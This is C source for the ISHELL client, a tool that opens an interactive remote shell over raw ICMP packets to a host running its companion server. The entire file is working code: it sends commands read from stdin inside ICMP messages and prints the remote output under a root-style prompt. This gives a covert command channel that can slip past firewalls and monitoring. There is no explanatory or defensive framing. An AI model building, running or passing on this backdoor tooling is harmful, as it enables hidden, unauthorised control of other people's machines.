/* ISHELL: client
 * by: Peter Kieltyka (elux)
 * http://peter.eluks.com / peter@eluks.com 
 * Updates from 0.2 by Mephistolist */

#include "ishell.h"

/* function prototypes */
void    usage(char *);
void    ish_timeout(int);
int     ish_prompt(int, struct sockaddr *, socklen_t);

void usage(char *program) {
    fprintf(stderr,
    "ICMP Shell v%s  (client)   -   by: Peter Kieltyka\n"
    "usage: %s [options] <host>\n\n"
    "options:\n"
    " -i <id>          Set session id; range: 0-65535 (default: 1515)\n"
    " -t <type>        Set ICMP type (default: 0)\n"
    " -p <packetsize>  Set packet size (default: 512)\n"
    "\nexample:\n"
    "%s -i 65535 -t 0 -p 1024 host.com\n"
    "\n", VERSION, program, program);

    exit(-1);
}

void ish_timeout(int empty) {
    (void)empty; // To mark paramter unused.
    printf("failed.\n\n");
    exit(-1);
}

int ish_prompt(int sockfd, struct sockaddr *sin, socklen_t sinlen) {
    fd_set  rset;
    int     n, maxfd;
    char    send_buf[ish_info.packetsize], recv_buf[ish_info.packetsize];

    while(1) {
        FD_ZERO(&rset);

        FD_SET(STDIN_FILENO, &rset);
        FD_SET(sockfd, &rset);
        maxfd = MAX(STDIN_FILENO, sockfd) + 1;

        select(maxfd, &rset, NULL, NULL, NULL);

        if(FD_ISSET(sockfd, &rset)) {
            memset(recv_buf, 0, sizeof(recv_buf));
            n = ish_recv(sockfd, recv_buf, sin, sinlen);

            if(n == 0)
                fprintf(stdout, "%s", recv_buf);
            else if(n == CNTRL_CEXIT)
                exit(0);
        }

        if(FD_ISSET(STDIN_FILENO, &rset)) {
            memset(send_buf, 0, sizeof(send_buf));
            read(STDIN_FILENO, send_buf, sizeof(send_buf));

            if(ish_send(sockfd, send_buf, sin, sinlen) < 0)
                error_msg();
        }
    }
}

int main(int argc, char *argv[]) {
    int     sockfd;
    char    *host, opt;
    struct  sockaddr_in sin;
    struct  hostent *he;

    if(argc < 2)
        usage(argv[0]);

    while((opt = getopt(argc, argv, "i:t:p:")) != -1) {
        switch(opt) {
        	case 'i':
            	ish_info.id = atoi(optarg);
            	break;
        	case 't':
            	ish_info.type = atoi(optarg);
            	break;
        	case 'p':
            	ish_info.packetsize = atoi(optarg);
            	break;
        	default:
            	usage(argv[0]);
            	break;
        }
    }
    host = argv[argc-1];

    if((he = gethostbyname(host)) == NULL) {
        fprintf(stderr, "Error: Cannot resolve %s!\n", host);
        exit(-1);
    }

    sin.sin_family = AF_INET;
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    memset(&(sin.sin_zero), 0, 8);

    if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1)
        error_msg();

    sendhdr.cntrl = 0;
    sendhdr.cntrl |= CNTRL_CPOUT;

    printf("\nICMP Shell v%s  (client)   -   by: Peter Kieltyka\n", VERSION);
    printf("--------------------------------------------------\n");
    printf("\nConnecting to %s...", host);

    setvbuf(stdout, NULL, _IONBF, 0);
    fflush(stdout);

    if(ish_send(sockfd, "id\n", (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        printf("failed.\n\n");
        error_msg();
    }

    signal(SIGALRM, ish_timeout);
    alarm(10);

    if(ish_recv(sockfd, NULL, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        printf("failed.\n\n");
        error_msg();
    }
    alarm(0);

    printf("done.\n\n");
    printf("# ");

    ish_prompt(sockfd, (struct sockaddr *)&sin, sizeof(sin));

    close(sockfd);
    exit(0);
}
